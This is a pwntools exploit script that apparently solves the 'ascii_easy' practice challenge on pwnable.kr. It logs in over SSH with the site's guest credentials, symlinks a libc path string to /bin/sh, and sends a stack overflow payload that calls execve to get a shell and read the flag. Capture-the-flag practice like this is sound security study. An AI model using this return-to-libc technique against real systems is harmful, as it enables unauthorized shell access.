from pwn import *

BASE = 0x5555e000

CALL_EXECVE = BASE + 0xb876a
NULL_ADDR = BASE + 0x6a3a
PATH_ADDR = BASE + 0x164b59

shell = ssh(user='ascii_easy', host='pwnable.kr', port=2222, password='guest')
shell.set_working_directory(symlink=True)
shell(f'mkdir -p ./sysdeps/unix/sysv/linux/')
shell(f'ln -s /bin/sh ./sysdeps/unix/sysv/linux/internal_statvfs.c')

# Payload = the padding + an address that calls execve() + the arguments (filename, argv, envp)
payload = b'A' * 0x20 + p32(CALL_EXECVE) + p32(PATH_ADDR)  + p32(NULL_ADDR)  + p32(NULL_ADDR)

io = shell.process(['ascii_easy', payload])
io.recvuntil(b"$ ")
io.sendline(b"cat flag")

print(io.recvline().decode())
